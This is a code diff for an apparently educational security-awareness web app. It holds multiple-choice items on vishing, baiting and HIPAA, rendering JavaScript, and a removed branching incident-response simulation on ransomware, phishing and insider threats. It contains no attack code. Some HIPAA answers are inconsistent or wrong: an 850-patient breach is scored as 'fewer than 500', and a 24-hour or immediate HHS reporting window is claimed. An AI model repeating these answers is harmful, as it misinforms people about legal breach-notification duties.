+  social: {
+    title: 'Social Engineering',
+    icon: '👤',
+    context: 'You manage security awareness. Review these real-world scenarios and identify the social engineering technique used in each.',
+    steps: [
+      {
+        type: 'mcq',
+        question: 'An employee gets a call: "Hi, this is Mike from IT. We\'re seeing errors on your account. I need your password to run a remote diagnostic." What type of attack is this?',
+        choices: [
+          { text: 'Vishing (voice phishing) using IT impersonation and pretexting', correct: true,  feedback: '✓ Correct. Voice call + false identity (IT support) + credential request = vishing with pretexting. IT will never ask for your password.' },
+          { text: 'Smishing — SMS-based phishing',                                  correct: false, feedback: 'Smishing is SMS/text-based. This is a phone call = vishing.' },
+          { text: 'Email phishing — fraudulent email',                              correct: false, feedback: 'Phishing is email. Phone call = vishing.' },
+          { text: 'Shoulder surfing — visual observation of credentials',           correct: false, feedback: 'Shoulder surfing is visual observation of what you type or see. This is a phone call = vishing.' }
+        ],
+        explanation: 'Vishing = voice phishing. Pretexting = fabricated scenario/identity. Together: caller impersonates IT, creates a believable story, requests credentials. Rule: IT will NEVER ask for your password over the phone — hang up and call IT directly via known number.'
+      },
+      {
+        type: 'mcq',
+        question: 'An attacker leaves USB drives labeled "Q4 Salary Data — CONFIDENTIAL" in the company parking lot. Curious employees plug them in and install malware. What type of attack is this?',
+        choices: [
+          { text: 'Baiting — enticing physical media used to deliver malware',     correct: true,  feedback: '✓ Correct. Enticing physical media (USB with compelling label) to trick users into executing malware = baiting.' },
+          { text: 'Tailgating — following someone through a secure door',          correct: false, feedback: 'Tailgating is physical access through secured doors. This uses physical media = baiting.' },
+          { text: 'Watering hole attack — compromising a website targets visit',   correct: false, feedback: 'Watering hole compromises websites. This uses physical USB drives = baiting.' },
+          { text: 'Quid pro quo — offering a service in exchange for information', correct: false, feedback: 'Quid pro quo involves an exchange offer. Dropping USB drives with no interaction = baiting.' }
+        ],
+        explanation: 'Baiting exploits curiosity with enticing physical media. Countermeasures: USB port lockdown via Group Policy, disable AutoRun/AutoPlay, employee training ("If you find a USB drive — do not plug it in").'
+      }
+    ]
+  },
+  compliance: {
+    title: 'Compliance Audit',
+    icon: '📋',
+    context: 'You are conducting a HIPAA compliance review for a healthcare organization. Evaluate these scenarios and identify violations and required controls.',
+    steps: [
+      {
+        type: 'mcq',
+        question: 'All hospital staff — including custodial staff — have access to all patient records regardless of their role. Which HIPAA principle is violated?',
+        choices: [
+          { text: 'Minimum Necessary / Least Privilege — access must be limited to job function',   correct: true,  feedback: '✓ Correct. HIPAA requires the Minimum Necessary standard: access only to PHI needed for the specific job. Custodial staff have no clinical need for patient records.' },
+          { text: 'Encryption requirement — all PHI must be encrypted at rest',                     correct: false, feedback: 'Encryption is required but the issue here is access control, not encryption.' },
+          { text: 'Audit logging — all PHI access must be logged',                                  correct: false, feedback: 'Audit logging is required but the primary violation is inappropriate access permissions.' },
+          { text: 'Business Associate Agreement — third-party vendor requirement',                  correct: false, feedback: 'BAAs apply to external vendors, not internal employee role-based access.' }
+        ],
+        explanation: 'HIPAA Minimum Necessary Rule: access PHI only to the extent necessary for the intended job purpose. Role-Based Access Control (RBAC) is the implementation — custodial staff → zero clinical record access. This is a fundamental HIPAA administrative safeguard.'
+      },
+      {
+        type: 'mcq',
+        question: 'A company laptop with unencrypted PHI for 850 patients was stolen. What is the correct HIPAA breach notification requirement?',
+        choices: [
+          { text: 'Notify affected patients within 60 days AND notify HHS within 60 days (fewer than 500 in state)',  correct: true,  feedback: '✓ Correct. < 500 patients in a state: notify individuals AND HHS within 60 days. 500+ in a state: also notify media.' },
+          { text: 'Only notify HHS — individuals don\'t need notification for physical theft',                        correct: false, feedback: 'Individual notification is always required for breaches affecting their PHI.' },
+          { text: 'Notify within 72 hours — same as GDPR',                                                           correct: false, feedback: '72 hours is GDPR. HIPAA is 60 days for individual/HHS notification.' },
+          { text: 'No notification needed if the laptop had a password',                                             correct: false, feedback: 'HIPAA safe harbor requires encryption — not just a password. Password ≠ encryption.' }
+        ],
+        explanation: 'HIPAA Breach Notification Rule: < 500 in a state → notify individuals + HHS within 60 days, submit to HHS annual log. 500+ in a state → also notify prominent media. Safe harbor from notification applies ONLY if PHI was fully encrypted (not just password-protected).'
+      }
+    ]
+  }
+};
+
+// ── SIM ENGINE STATE ──
+let _simScenario = null;
+let _simStep = 0;
+let _simScore = 0;
+let _simTotal = 0;
+let _simAnswered = false;
+
+function initSimCards() {
+  document.querySelectorAll('#section-sim .scenario-card[data-scenario]').forEach(card => {
+    card.style.cursor = 'pointer';
+    card.addEventListener('click', () => launchSim(card.dataset.scenario));
+  });
+}
+
+function launchSim(id) {
+  _simScenario = SIM_SCENARIOS[id];
+  _simStep = 0; _simScore = 0; _simTotal = 0; _simAnswered = false;
+  document.getElementById('simIntroSection').style.display = 'none';
+  const c = document.getElementById('simulationContainer');
+  c.style.display = 'block';
+  c.classList.add('active');
+  renderSimStep();
+}
+
+function renderSimStep() {
+  const step = _simScenario.steps[_simStep];
+  const total = _simScenario.steps.length;
+  const c = document.getElementById('simulationContainer');
+  _simAnswered = false;
+
+  // Progress dots
+  const dots = Array.from({length: total}, (_,i) =>
+    `<div class="progress-dot ${i < _simStep ? 'completed' : i === _simStep ? 'active' : ''}"></div>`
+  ).join('');
+
+  let contentHtml = '';
+  if (step.type === 'email') {
+    contentHtml = `
+      <div class="email-window">
+        <div class="email-header">
+          <div class="email-field"><span class="email-label">FROM:</span><span class="email-value email-suspicious">${step.fromDisplay}</span></div>
+          <div class="email-field"><span class="email-label">TO:</span><span class="email-value">${step.to}</span></div>
+          <div class="email-field"><span class="email-label">SUBJECT:</span><span class="email-value email-suspicious">${step.subject}</span></div>
+        </div>
+        <div class="email-body" style="white-space:pre-line">${step.body}</div>
+      </div>`;
+  } else if (step.type === 'terminal') {
+    const lines = step.lines.map((l,i) =>
+      `<div class="terminal-line" style="animation-delay:${i*0.07}s"><span class="${l.cls}">${l.text}</span></div>`
+    ).join('');
+    contentHtml = `
+      <div class="terminal-window">
+        <div class="terminal-header">
+          <div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div>
+          <div class="terminal-title">analyst terminal — live session</div>
+        </div>
+        <div class="terminal-content">${lines}</div>
+      </div>`;
+  }
+
+  const choicesHtml = step.choices.map((ch, i) => `
+    <button class="choice-btn" id="sc-${i}" onclick="simPick(${i})">
+      <span class="choice-letter">${['A','B','C','D'][i]}</span>
+      <span class="choice-text">${ch.text}</span>
+    </button>`).join('');
+
+  c.innerHTML = `
+    <div class="simulation-header">
+      <div class="sim-title">${_simScenario.title}</div>
+      <div class="sim-context">${_simScenario.context}</div>
+    </div>
+    <div class="progress-indicator">${dots}</div>
+    ${contentHtml}
+    <div class="question-section">
+      <div class="question-text">${step.question}</div>
+      <div class="choices-container">${choicesHtml}</div>
+    </div>
+    <div class="feedback-section" id="simFb"></div>
+    <div class="action-buttons">
+      <button class="btn btn-secondary" onclick="simBackToMenu()">← All Simulations</button>
+      <button class="btn btn-primary" id="simNextBtn" style="display:none" onclick="simNext()">
+        ${_simStep < total - 1 ? 'Next Step →' : 'See Results'}
+      </button>
+    </div>`;
+}
+
+function simPick(idx) {
+  if (_simAnswered) return;
+  _simAnswered = true;
+  const step = _simScenario.steps[_simStep];
+  const choice = step.choices[idx];
+  _simTotal++;
+  if (choice.correct) _simScore++;
+
+  document.querySelectorAll('.choice-btn').forEach((btn, i) => {
+    btn.disabled = true;
+    if (step.choices[i].correct) btn.classList.add('correct');
+    else if (i === idx && !choice.correct) btn.classList.add('incorrect');
+  });
+
+  const fb = document.getElementById('simFb');
+  fb.classList.add('show');
+  const feedbackText = choice.feedback || (choice.correct ? '✓ Correct!' : '✗ Incorrect.');
+  fb.innerHTML = `
+    <div class="feedback-title ${choice.correct ? 'correct' : 'incorrect'}">${choice.correct ? '✓ Correct' : '✗ Incorrect'}</div>
+    <div class="feedback-text">${feedbackText}</div>
+    <div class="feedback-explanation">
+      <div class="explanation-title">// Explanation</div>
+      <div class="explanation-text">${step.explanation}</div>
+    </div>`;
+  document.getElementById('simNextBtn').style.display = 'inline-block';
+}
+
+function simNext() {
+  if (_simStep < _simScenario.steps.length - 1) {
+    _simStep++;
+    renderSimStep();
+  } else {
+    showSimResults();
+  }
+}
+
+function simBackToMenu() {
+  document.getElementById('simulationContainer').style.display = 'none';
+  document.getElementById('simulationContainer').classList.remove('active');
+  document.getElementById('simIntroSection').style.display = 'block';
+}
+
+function showSimResults() {
+  const pct = _simTotal > 0 ? Math.round((_simScore / _simTotal) * 100) : 0;
+  const g = pct >= 80 ? {icon:'🏆', label:'EXCELLENT', color:'#00ff9f'} : pct >= 60 ? {icon:'⚡', label:'GOOD', color:'#ffaa00'} : {icon:'📚', label:'NEEDS REVIEW', color:'#ff3366'};
+  const scenarioId = Object.keys(SIM_SCENARIOS).find(k => SIM_SCENARIOS[k] === _simScenario);
+  document.getElementById('simulationContainer').innerHTML = `
+    <div class="simulation-header" style="text-align:center;padding:3rem 2rem">
+      <div style="font-size:3rem;margin-bottom:1rem">${g.icon}</div>
+      <div class="sim-title" style="font-size:2rem;color:${g.color}">${g.label}</div>
+      <div style="font-family:var(--mono,monospace);font-size:3.5rem;font-weight:700;color:${g.color};margin:1rem 0">${pct}%</div>
+      <div class="sim-context">${_simScore} / ${_simTotal} correct — ${_simScenario.title}</div>
+    </div>
+    <div class="action-buttons" style="margin-top:2rem">
+      <button class="btn btn-secondary" onclick="simBackToMenu()">← All Simulations</button>
+      <button class="btn btn-primary" onclick="launchSim('${scenarioId}')">↺ Retry</button>
+    </div>`;
+}
+
+// Init on load
+if (document.readyState === 'loading') {
+  document.addEventListener('DOMContentLoaded', initSimCards);
+} else {
+  initSimCards();
+}
+
+</script>
+
+<script>
 
 // ── STATE ──
 let dragSrc = null, dragType = null;
@@ -3028,758 +3712,9 @@ function resetIAM() {
 }
 
 
+</script>
 
-
-// ════════════════════════════════════════════════
-// SCENARIO DATA (was scenario-data.js)
-// ════════════════════════════════════════════════
-const SCORE_BANDS = {
-  optimal: { label: 'ELITE RESPONDER', color: '#00f5a0', desc: 'Outstanding decision-making under pressure. You contained the threat with minimal impact.' },
-  good:    { label: 'COMPETENT ANALYST', color: '#00d4ff', desc: 'Solid response with good decisions. A few missteps but the core threat was handled effectively.' },
-  partial: { label: 'JUNIOR ANALYST', color: '#ffd32a', desc: 'Mixed results. Some key decisions were suboptimal and increased damage. Review the debrief carefully.' },
-  poor:    { label: 'NEEDS TRAINING', color: '#ff4757', desc: 'Critical errors allowed the threat to escalate. Study the incident response lifecycle before retrying.' }
-};
-
-const SCENARIOS = {
-  midnight_breach: {
-    id: 'midnight_breach',
-    title: 'The Midnight Breach',
-    roles: 'SOC Analyst / Incident Responder',
-    intro: "It's 2:47 AM. Your pager goes off. Three servers in the hospital's patient records wing are showing abnormal encryption activity. The SIEM is lighting up. Your manager is calling. This is real.",
-    nodes: {
-      start: {
-        timeStamp: '02:47 AM',
-        threatLevel: 1,
-        situation: "SIEM alert: three servers (MEDCORP-SRV-04, 05, 06) showing mass file encryption events. Unusual outbound traffic to 185.220.101.x (known Tor exit node). No confirmed ransomware note yet.",
-        question: "What is your FIRST action?",
-        choices: [
-          { text: "Immediately isolate all three servers from the network", tag: "Containment first", outcome: "Smart. Cutting network access stops the ransomware from spreading and communicating with its C2 server.", points: 30, next: "n2_isolated" },
-          { text: "Wake up the CISO and wait for authorization before acting", tag: "Escalate first", outcome: "Escalation is important but ransomware doesn't wait. Precious minutes lost while it continues encrypting.", points: 10, next: "n2_waited" },
-          { text: "Run antivirus scan on all three servers", tag: "AV scan", outcome: "AV won't stop active encryption in progress and tips off the malware. Wrong tool for active incident.", points: 5, next: "n2_avscanned" },
-          { text: "Pull network cables and call your forensics team simultaneously", tag: "Isolate + Escalate", outcome: "Excellent. Immediate isolation stops spread while getting the right people moving in parallel.", points: 35, next: "n2_isolated" }
-        ]
-      },
-      n2_isolated: {
-        timeStamp: '02:53 AM',
-        threatLevel: 2,
-        situation: "Servers isolated. Encryption activity stopped on all three. You find a ransom note: 'Your files are encrypted. Pay 15 BTC to recover them. You have 72 hours.' The attacker gained access via a compromised vendor VPN account.",
-        question: "The attacker used a vendor VPN account. What do you do with vendor access?",
-        choices: [
-          { text: "Disable ALL vendor/third-party VPN accounts immediately", tag: "Aggressive lockdown", outcome: "Correct. You don't know which other vendor accounts may be compromised. Disable all until audited.", points: 35, next: "n3_vendor_locked" },
-          { text: "Disable only the specific compromised vendor account", tag: "Targeted response", outcome: "Partially correct — but the attacker may have pivoted to other vendor accounts. Too narrow.", points: 15, next: "n3_vendor_partial" },
-          { text: "Force password resets on all vendor accounts", tag: "Password reset", outcome: "Better than nothing, but active sessions may persist. Disable is safer than reset during active incident.", points: 20, next: "n3_vendor_partial" },
-          { text: "Leave vendor access intact to monitor attacker movement", tag: "Honeypot tactic", outcome: "Risky without proper monitoring infrastructure. Attacker continues to have access to your environment.", points: 5, next: "n3_vendor_partial" }
-        ]
-      },
-      n2_waited: {
-        timeStamp: '02:53 AM',
-        threatLevel: 3,
-        situation: "15 minutes passed waiting for authorization. Two more servers (MEDCORP-SRV-08, 09) are now encrypted. The ransomware spread via network shares. Ransom demand: 25 BTC.",
-        question: "The spread has escalated. What now?",
-        choices: [
-          { text: "Emergency network segment shutdown — isolate entire affected VLAN", tag: "Emergency containment", outcome: "Correct action, though delayed. Isolate the segment now to prevent further spread.", points: 20, next: "n3_vendor_locked" },
-          { text: "Disconnect the entire hospital network to be safe", tag: "Full shutdown", outcome: "Too aggressive. Disconnecting all hospital systems risks patient safety for systems still unaffected.", points: 10, next: "n3_vendor_partial" },
-          { text: "Pay the ransom to recover files quickly", tag: "Pay ransom", outcome: "Never recommended. No guarantee of decryption, funds criminal activity, and you remain compromised.", points: 0, next: "n3_vendor_partial" },
-          { text: "Isolate affected servers and begin incident response protocol", tag: "Structured IR", outcome: "Right direction. Late but correct — execute containment and follow IR lifecycle properly.", points: 25, next: "n3_vendor_locked" }
-        ]
-      },
-      n2_avscanned: {
-        timeStamp: '02:53 AM',
-        threatLevel: 3,
-        situation: "The AV scan triggered the ransomware's detection logic. It accelerated encryption and deleted shadow copies. Three more servers are now encrypted. Ransom: 20 BTC.",
-        question: "Situation worsened. How do you stop the spread now?",
-        choices: [
-          { text: "Immediately isolate all affected servers and connected network segments", tag: "Emergency isolation", outcome: "Correct — better late than never. Cut network access to stop spread immediately.", points: 20, next: "n3_vendor_locked" },
-          { text: "Run a different antivirus with updated signatures", tag: "More AV scans", outcome: "Still wrong approach. The active threat requires network isolation, not scanning.", points: 0, next: "n3_vendor_partial" },
-          { text: "Restore from backups immediately", tag: "Restore now", outcome: "Restoration is recovery phase — you haven't contained the threat yet. Restored systems will be reinfected.", points: 5, next: "n3_vendor_partial" },
-          { text: "Pull network cables on all affected servers, notify management", tag: "Physical isolation + escalation", outcome: "Physical isolation is effective. Get management involved immediately given the escalation.", points: 25, next: "n3_vendor_locked" }
-        ]
-      },
-      n3_vendor_locked: {
-        timeStamp: '03:15 AM',
-        threatLevel: 2,
-        situation: "Vendor access locked. Forensics team is online. They find the ransomware deleted Volume Shadow Copies (VSS) on encrypted servers. You have offline backups from 2 days ago.",
-        question: "Forensics wants to examine the encrypted servers. What should happen BEFORE any remediation?",
-        choices: [
-          { text: "Create forensic disk images of all affected servers before touching anything", tag: "Preserve evidence", outcome: "Critical step. Forensic images preserve evidence for investigation, legal proceedings, and root cause analysis.", points: 35, next: "n4_forensics" },
-          { text: "Immediately wipe and restore from backups to minimize downtime", tag: "Fast recovery", outcome: "Destroying evidence before analysis is a critical error. You lose ability to understand the full breach scope.", points: 5, next: "n4_noforensics" },
-          { text: "Attempt to decrypt files using known ransomware decryptors", tag: "Decrypt first", outcome: "Check decryptors — but only on a copy, never on the only version. And forensic imaging comes first.", points: 15, next: "n4_forensics" },
-          { text: "Preserve images AND simultaneously start backup restoration on unaffected systems", tag: "Parallel approach", outcome: "Excellent. Preserve evidence on affected systems while starting recovery on clean systems in parallel.", points: 40, next: "n4_forensics" }
-        ]
-      },
-      n3_vendor_partial: {
-        timeStamp: '03:15 AM',
-        threatLevel: 3,
-        situation: "Vendor access partially addressed. Forensics team arrives. Encrypted servers still hold evidence. VSS was deleted by ransomware.",
-        question: "What is the most important thing to do with the encrypted servers RIGHT NOW?",
-        choices: [
-          { text: "Create forensic disk images before any other action", tag: "Evidence preservation", outcome: "Correct. Even with delays, preserving forensic evidence now is critical before any remediation.", points: 30, next: "n4_forensics" },
-          { text: "Wipe and restore — you need systems back online fast", tag: "Skip forensics", outcome: "Wiping evidence is a serious mistake. You can't understand the full scope of the breach.", points: 5, next: "n4_noforensics" },
-          { text: "Pay the ransom to recover files while forensics works", tag: "Pay ransom", outcome: "Ransom payment is not recommended. It funds criminals and doesn't guarantee decryption.", points: 0, next: "n4_noforensics" },
-          { text: "Image the drives and block outbound traffic to Tor exit nodes", tag: "Evidence + network control", outcome: "Good combination — preserve evidence and cut off C2 communication channels.", points: 35, next: "n4_forensics" }
-        ]
-      },
-      n4_forensics: {
-        timeStamp: '04:30 AM',
-        threatLevel: 2,
-        situation: "Forensic images captured. Analysis reveals: initial access via vendor VPN → lateral movement using PsExec → ransomware deployed via scheduled task. Patient records systems affected. HIPAA breach notification requirements triggered.",
-        question: "HIPAA requires breach notification. What is the notification timeline for affected patients?",
-        choices: [
-          { text: "Within 60 days of discovering the breach", tag: "HIPAA Rule", outcome: "Correct. HIPAA Breach Notification Rule requires notification to affected individuals within 60 days of breach discovery.", points: 30, next: "n5_final" },
-          { text: "Within 24 hours — this is a healthcare emergency", tag: "24 hours", outcome: "24 hours is the timeframe for HIPAA security incidents to HHS if >500 people affected in same state. Patient notification is 60 days.", points: 10, next: "n5_final" },
-          { text: "Within 30 days", tag: "30 days", outcome: "Close but incorrect. HIPAA requires 60 days for patient notification, not 30.", points: 15, next: "n5_final" },
-          { text: "Immediately — patients must be notified same day", tag: "Same day", outcome: "Not the HIPAA requirement. 60 days for patient notification. Immediate reporting to HHS only if 500+ affected.", points: 5, next: "n5_final" }
-        ]
-      },
-      n4_noforensics: {
-        timeStamp: '04:30 AM',
-        threatLevel: 3,
-        situation: "Evidence destroyed in rush to recover. You cannot determine full breach scope or how attacker maintained persistence. HIPAA breach confirmed — patient records accessed.",
-        question: "Without forensic evidence, how do you determine the breach scope?",
-        choices: [
-          { text: "Assume worst case — all patient records potentially accessed, notify accordingly", tag: "Assume worst case", outcome: "Without evidence, assuming worst case is prudent for notification purposes and limits legal liability.", points: 25, next: "n5_final" },
-          { text: "Notify only the patients whose records were on encrypted servers", tag: "Narrow notification", outcome: "Risky — without forensic evidence you cannot confirm attacker didn't access other systems before encryption.", points: 10, next: "n5_final" },
-          { text: "Delay notification until you can determine exact scope", tag: "Delay notification", outcome: "HIPAA has strict timelines. Delaying notification beyond 60 days violates compliance requirements.", points: 5, next: "n5_final" },
-          { text: "Engage a forensics firm to recover what evidence remains from logs", tag: "Recover evidence", outcome: "Good — SIEM logs, network logs, and firewall logs may still be available even without disk images.", points: 30, next: "n5_final" }
-        ]
-      },
-      n5_final: {
-        timeStamp: '06:00 AM',
-        threatLevel: 1,
-        situation: "Threat contained. Recovery underway. Management wants to know what long-term controls will prevent recurrence.",
-        question: "Which set of controls BEST prevents this attack from recurring?",
-        choices: [
-          { text: "MFA on all VPN access + network segmentation + immutable offline backups + EDR deployment", tag: "Layered defense", outcome: "Perfect. Addresses the root cause (VPN compromise), limits lateral movement (segmentation), ensures recovery (backups), and detects future threats (EDR).", points: 40, next: "terminal_good" },
-          { text: "Change all vendor passwords and increase firewall rules", tag: "Basic hardening", outcome: "Helpful but insufficient. Doesn't address MFA, segmentation, or backup gaps.", points: 15, next: "terminal_partial" },
-          { text: "Pay for cyber insurance to cover future ransomware incidents", tag: "Insurance only", outcome: "Insurance helps with recovery costs but does nothing to prevent the attack from happening again.", points: 5, next: "terminal_bad" },
-          { text: "Deploy email filtering to block phishing (the most common ransomware vector)", tag: "Email security", outcome: "Good control but this attack came through VPN, not email. Address the actual attack vector.", points: 10, next: "terminal_partial" }
-        ]
-      },
-      terminal_good: { isTerminal: true, terminalType: 'good', message: "Incident contained with minimal patient impact. Forensic evidence preserved. HIPAA notification filed. Board briefed. New controls prevent recurrence. Hospital operations restored within 18 hours." },
-      terminal_partial: { isTerminal: true, terminalType: 'partial', message: "Incident contained but gaps remain. Some evidence lost. Basic controls added but comprehensive hardening incomplete. Risk of similar breach within 12 months is elevated." },
-      terminal_bad: { isTerminal: true, terminalType: 'bad', message: "Serious missteps throughout. Evidence destroyed, scope unknown, root cause unresolved, and inadequate controls leave the hospital highly vulnerable to repeat attack." }
-    }
-  },
-
-  phishing_campaign: {
-    id: 'phishing_campaign',
-    title: 'The Phishing Campaign',
-    roles: 'Security Analyst / IR Lead',
-    intro: "Monday morning. Three executives have forwarded suspicious emails. Your email gateway flagged 47 similar messages in the last 2 hours. The CFO says she almost clicked a link. This is a targeted campaign.",
-    nodes: {
-      start: {
-        timeStamp: '08:15 AM',
-        threatLevel: 2,
-        situation: "47 phishing emails blocked. 3 executives received them (CEO, CFO, General Counsel). Subject: 'Urgent: DocuSign - Signature Required - Board Resolution.' Links go to a convincing login page hosted on microsoftonline-secure-signin.com. No confirmed clicks yet.",
-        question: "What is your immediate first step?",
-        choices: [
-          { text: "Block the malicious domain at the email gateway and DNS level", tag: "Technical block", outcome: "Smart. Prevent any future delivery or access to the phishing domain immediately.", points: 30, next: "n2_domain_blocked" },
-          { text: "Send an all-staff awareness email warning about the campaign", tag: "Awareness", outcome: "Good but secondary. Block first, then warn. Don't let more emails land while drafting communications.", points: 15, next: "n2_domain_blocked" },
-          { text: "Call each executive personally to confirm they haven't clicked", tag: "Executive check", outcome: "Critical step — but do the technical block simultaneously. Call while your team handles the block.", points: 20, next: "n2_domain_blocked" },
-          { text: "Block the domain AND call all three executives simultaneously with your team", tag: "Block + verify", outcome: "Excellent. Parallel action: technical blocking + executive verification covers both dimensions immediately.", points: 40, next: "n2_domain_blocked" }
-        ]
-      },
-      n2_domain_blocked: {
-        timeStamp: '08:45 AM',
-        threatLevel: 2,
-        situation: "Domain blocked. Executives notified. The CFO admits she may have entered her credentials on the site 'just to see what it was' before the block. She says she uses the same password for her email and banking.",
-        question: "The CFO may have entered credentials. What is the IMMEDIATE priority?",
-        choices: [
-          { text: "Reset CFO's Microsoft 365 credentials and revoke all active sessions immediately", tag: "Credential reset + session kill", outcome: "Correct. Credential compromise means you must rotate and kill all sessions before the attacker uses them.", points: 40, next: "n3_cfo_locked" },
-          { text: "Ask the CFO to change her password herself when she has time", tag: "Self-service reset", outcome: "Far too slow. 'When she has time' could be hours. Account may already be accessed.", points: 0, next: "n3_cfo_partial" },
-          { text: "Monitor her account for suspicious activity before taking action", tag: "Monitor first", outcome: "Wrong approach. If credentials are compromised, monitoring while attacker operates is too passive.", points: 5, next: "n3_cfo_partial" },
-          { text: "Reset credentials, kill sessions, enable MFA, and check email forwarding rules", tag: "Full account lockdown", outcome: "Comprehensive. BEC attackers often set up inbox forwarding rules immediately after compromise.", points: 45, next: "n3_cfo_locked" }
-        ]
-      },
-      n3_cfo_locked: {
-        timeStamp: '09:30 AM',
-        threatLevel: 2,
-        situation: "CFO account secured. Audit log shows no successful logins from the phishing site. However, you find the CFO's email auto-forwarding was enabled to an external Gmail address 3 weeks ago. This may have been a prior compromise.",
-        question: "The auto-forward rule suggests earlier compromise. What do you investigate?",
-        choices: [
-          { text: "Review all email forwarding rules across the entire organization", tag: "Org-wide audit", outcome: "Critical. BEC attackers set forwarding rules on multiple compromised accounts. Find them all.", points: 40, next: "n4_scope" },
-          { text: "Only investigate the CFO's account — that's the confirmed compromise", tag: "Narrow scope", outcome: "Too narrow. The forwarding rule predates this phishing campaign — there may be other compromised accounts.", points: 10, next: "n4_scope" },
-          { text: "Notify the CFO and close the forwarding rule immediately", tag: "Close and notify", outcome: "You should close the rule, but that's step 2. First, audit all accounts for similar rules.", points: 20, next: "n4_scope" },
-          { text: "Check all 365 audit logs for forwarding rule creation in the past 90 days", tag: "Historical audit", outcome: "Excellent. 90-day lookback on forwarding rule creation across the org will surface the full scope.", points: 45, next: "n4_scope" }
-        ]
-      },
-      n3_cfo_partial: {
-        timeStamp: '09:30 AM',
-        threatLevel: 3,
-        situation: "Delayed response. Audit log shows a successful login from a Ukrainian IP to CFO's account 20 minutes ago. Attacker accessed inbox and downloaded email archives. Auto-forwarding was also enabled.",
-        question: "Active account compromise confirmed. What now?",
-        choices: [
-          { text: "Force account lockout, revoke all sessions, reset credentials, enable MFA now", tag: "Emergency lockdown", outcome: "Correct — though late. Execute full account lockdown immediately.", points: 30, next: "n4_scope" },
-          { text: "Contact Microsoft to investigate the unauthorized access", tag: "Vendor escalation", outcome: "You can involve Microsoft, but internal action must come first. Don't wait for vendor response.", points: 10, next: "n4_scope" },
-          { text: "Preserve evidence by letting the session continue while monitoring", tag: "Monitor the attacker", outcome: "Too risky without proper honeypot infrastructure. Attacker is actively exfiltrating data.", points: 5, next: "n4_scope" },
-          { text: "Lockout + session revocation + check for other compromised accounts immediately", tag: "Lockout + scope", outcome: "Good. Act fast and immediately broaden investigation to find other compromised accounts.", points: 35, next: "n4_scope" }
-        ]
-      },
-      n4_scope: {
-        timeStamp: '11:00 AM',
-        threatLevel: 2,
-        situation: "Audit reveals 4 executive and finance team accounts had forwarding rules set to the same Gmail domain over the past 6 weeks. All financial emails were forwarded. The attacker now knows your financial processes intimately — prime setup for BEC wire fraud.",
-        question: "Which control would BEST prevent Business Email Compromise going forward?",
-        choices: [
-          { text: "Require out-of-band verbal confirmation for all wire transfers over $5,000", tag: "Out-of-band verification", outcome: "Perfect. Verbal confirmation via a known phone number defeats BEC regardless of how convincing the email is.", points: 40, next: "terminal_good" },
-          { text: "Implement DMARC, DKIM, and SPF on your domain", tag: "Email authentication", outcome: "Great for preventing domain spoofing but doesn't stop compromised internal accounts from sending fraudulent emails.", points: 20, next: "terminal_partial" },
-          { text: "Enable MFA for all email accounts", tag: "MFA", outcome: "Critical and should be done immediately — but MFA alone doesn't stop BEC if account is already set up with forwarding.", points: 25, next: "terminal_partial" },
-          { text: "Out-of-band verification + MFA + block auto-forwarding to external domains + DMARC", tag: "Layered BEC controls", outcome: "Comprehensive BEC prevention. Covers initial compromise prevention, detection, and financial fraud prevention.", points: 45, next: "terminal_good" }
-        ]
-      },
-      terminal_good: { isTerminal: true, terminalType: 'good', message: "Campaign neutralized. Compromised accounts secured. BEC controls deployed. No fraudulent transfers executed. Full scope identified. Email security posture significantly hardened." },
-      terminal_partial: { isTerminal: true, terminalType: 'partial', message: "Immediate threat addressed but BEC risk remains. Controls implemented but gaps in scope or prevention leave the organization vulnerable to follow-on fraud attempts." },
-      terminal_bad: { isTerminal: true, terminalType: 'bad', message: "Significant delays and missed indicators allowed broad account compromise. Financial data exfiltrated. BEC fraud risk extremely high. Immediate external IR engagement recommended." }
-    }
-  },
-
-  insider_threat: {
-    id: 'insider_threat',
-    title: 'The Insider Threat',
-    roles: 'Security Analyst / HR Liaison',
-    intro: "Your DLP system flagged unusual activity: a senior developer has been copying large amounts of code and customer data to a personal USB drive over the past three weeks. HR has flagged the same employee as a potential resignation risk. How do you handle this?",
-    nodes: {
-      start: {
-        timeStamp: 'Day 1, 09:00 AM',
-        threatLevel: 2,
-        situation: "DLP alerts: Jake Mercer (Sr. Developer, 6 years tenure) copied 4.2GB of source code and customer PII to a USB device over 14 separate sessions. He has access to payment processing systems and customer database. No USB policy violation acknowledged. He's scheduled for a 1-on-1 with his manager tomorrow.",
-        question: "What is your FIRST action in this investigation?",
-        choices: [
-          { text: "Confront Jake immediately and demand he return the USB drive", tag: "Direct confrontation", outcome: "Premature. Tipping off the suspect before gathering evidence allows them to destroy, encrypt, or hide data.", points: 5, next: "n2_evidence" },
-          { text: "Quietly pull and preserve all DLP logs, access logs, and USB activity before taking any action", tag: "Silent evidence gathering", outcome: "Correct. Preserve all evidence first without alerting the suspect. Evidence preservation is the foundation.", points: 40, next: "n2_evidence" },
-          { text: "Immediately revoke Jake's access to all systems", tag: "Access revocation", outcome: "Too early. Revoking access immediately alerts Jake, may constitute premature action, and you haven't looped in HR/Legal.", points: 10, next: "n2_tipped" },
-          { text: "Notify HR and Legal immediately, then gather evidence together", tag: "HR/Legal + evidence", outcome: "Good approach. Insider threat investigations require HR and Legal involvement from day one to protect the organization.", points: 35, next: "n2_evidence" }
-        ]
-      },
-      n2_evidence: {
-        timeStamp: 'Day 1, 02:00 PM',
-        threatLevel: 2,
-        situation: "Evidence gathered: 4.2GB copied, confirmed customer PII and proprietary source code. HR confirms Jake submitted resignation letter this morning — effective in 2 weeks. Legal is now involved. Jake does not know he's under investigation.",
-        question: "Jake resigned. How should you handle his remaining access during the 2-week notice period?",
-        choices: [
-          { text: "Immediately revoke all access — resigned employees are high risk", tag: "Immediate revocation", outcome: "Common approach but discuss with HR/Legal first. Abrupt revocation may have legal implications and tips him off.", points: 20, next: "n3_monitor" },
-          { text: "Reduce Jake's access to only what's needed for his remaining tasks + increase monitoring", tag: "Reduced access + monitor", outcome: "Strong approach. Limit blast radius while maintaining operational normalcy. Enhanced monitoring catches new activity.", points: 40, next: "n3_monitor" },
-          { text: "Keep all access the same — you don't want to tip him off before legal is ready", tag: "No change", outcome: "Too passive. Full access for 2 weeks with knowledge he's exfiltrating is unacceptable risk.", points: 5, next: "n3_nomonitor" },
-          { text: "Have HR cancel the 2-week notice and terminate immediately with full access revocation", tag: "Immediate termination", outcome: "Valid approach if Legal agrees. Immediate termination with documented cause followed by complete access revocation.", points: 30, next: "n3_monitor" }
-        ]
-      },
-      n2_tipped: {
